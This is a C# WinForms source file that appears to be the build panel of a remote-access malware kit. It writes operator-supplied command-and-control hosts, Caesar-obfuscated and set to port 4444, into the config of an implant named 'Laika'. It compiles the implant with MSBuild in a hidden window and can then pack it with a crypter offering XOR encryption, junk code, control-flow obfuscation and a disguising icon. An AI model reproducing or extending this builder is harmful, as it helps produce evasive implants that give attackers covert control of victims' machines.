using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    public partial class BuildMenu : Form
    {
        public BuildMenu()
        {
            InitializeComponent();
        }

        private void BuildMenu_Load(object sender, EventArgs e)
        {
            this.CenterToParent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "")
            {
                Hosts.Items.Add(textBox1.Text);
                button2.Enabled = true;
                textBox1.Clear();
            }
        }

        private void Hosts_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                int index = Hosts.IndexFromPoint(e.Location);
                if (index < 0)
                    return;

                Hosts.SelectedIndex = index;
                contextMenuStrip1.Show(Cursor.Position);
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Hosts.Items.RemoveAt(Hosts.SelectedIndex);
            if (Hosts.Items.Count == 0)
                button2.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string output = "";
            button2.Text = "Building...";
            button2.Update();

            string filePath = @"..\Laika\config.h";
            string newContent = @"#define FALLBACK_SERVERS " + Hosts.Items.Count;
            newContent += "\n\nchar* fallback_servers[FALLBACK_SERVERS] = {\n";
            for (int i = 0; Hosts.Items.Count > i; i++)
            {
                newContent += "\t\"" + Utils.CAESAR(Hosts.Items[i].ToString()) + "\",\n";
            }
            newContent += "};\n\n";
            newContent += "int fallback_servers_ip[FALLBACK_SERVERS] = {\n";
            for (int j = 0; Hosts.Items.Count > j; j++)
            {
                newContent += "\t4444,\n";
            }
            newContent += "};";

            File.WriteAllText(filePath, newContent);
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C \"\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\"\" -nologo -latest -property installationPath";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            process.StartInfo = startInfo;
            process.Start();
            string vs_path = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            vs_path = vs_path.Replace("\r\n", "");
            string cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe";

            startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../Laika /p:Configuration=Release;Platform=x86";
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();

            process.WaitForExit();

            if (!checkBox1.Checked)
            {
                File.WriteAllText("build_log.txt", output);
                button2.Text = "Done !";
                return;
            }

            string args = string.Empty;
            if (checkBox2.Checked)
                args += " --xor " + textBox2.Text;
            if (checkBox3.Checked)
                args += " --junk " + numericUpDown1.Value.ToString();
            if (checkBox4.Checked)
                args += " --control_flow " + numericUpDown2.Value.ToString();
            if (pictureBox1.ImageLocation != "")
                args += " --icon " + pictureBox1.ImageLocation;

            startInfo.Arguments = "/C cd ..\\patate-crypter\\Builder && python gui.py --file ..\\..\\bin\\Laika.exe" + args;
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();

            process.WaitForExit();
            File.WriteAllText("build_log.txt", output);

            button2.Text = "Done !";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Icon files (*.ico)|*.ico",
                Title = "Select your icon"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = openFileDialog.FileName;
                pictureBox1.ImageLocation = filePath;
                pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                pictureBox1.Update();
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            bool flag = checkBox1.Checked;
            
            checkBox2.Enabled = flag;
            checkBox3.Enabled = flag;
            checkBox4.Enabled = flag;
            pictureBox1.Enabled = flag;
            button3.Enabled = flag;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            label4.Enabled = checkBox2.Checked;
            textBox2.Enabled = checkBox2.Checked;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            label5.Enabled = checkBox3.Checked;
            numericUpDown1.Enabled = checkBox3.Checked;
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            label6.Enabled = checkBox4.Checked;
            numericUpDown2.Enabled = checkBox4.Checked;
        }
    }
}
